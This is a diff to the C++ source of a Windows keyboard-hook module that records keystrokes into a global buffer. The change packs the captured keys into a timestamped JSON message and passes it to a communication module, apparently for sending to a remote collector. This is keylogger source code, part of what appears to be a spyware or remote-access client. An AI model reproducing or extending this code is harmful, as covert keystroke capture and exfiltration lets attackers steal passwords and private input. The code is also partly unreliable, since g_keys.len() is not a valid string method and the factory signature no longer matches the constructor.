@@ -3,13 +3,16 @@
 //
 
 #include <iostream>
-#include <boost/dll/alias.hpp> // for BOOST_DLL_ALIAS
+#include <boost/dll/alias.hpp>
+#include <boost/property_tree/ptree.hpp>
+#include <boost/property_tree/json_parser.hpp>
 
 #include "ModuleKeyboard.hpp"
 
 static std::string g_keys;
 
-ModuleKeyboard::ModuleKeyboard(Client &client) : _client(client) {}
+ModuleKeyboard::ModuleKeyboard(IModuleCommunication *moduleCommunication)
+  : _moduleCommunication(moduleCommunication) {}
 
 LRESULT CALLBACK ModuleKeyboard::hookCallback(int nCode, WPARAM wParam, LPARAM lParam ) {
     char pressedKey;
@@ -69,7 +72,15 @@ boost::shared_ptr<ModuleKeyboard> ModuleKeyboard::create(Client &client) {
 
 void ModuleKeyboard::sendKeys() {
   if (g_keys.len() > 5) {
-    std::cout << g_keys << std::endl;
+    boost::property_tree::ptree data;
+    data.put("keys", g_keys);
+
+    boost::property_tree::ptree ptree;
+    ptree.put("timestamp", std::to_string(std::time(nullptr)));
+    ptree.put("type", "Keyboard");
+    ptree.add_child("data", data);
+
+    this->_moduleCommunication->send(ptree);
     g_keys.clear();
   }
 }
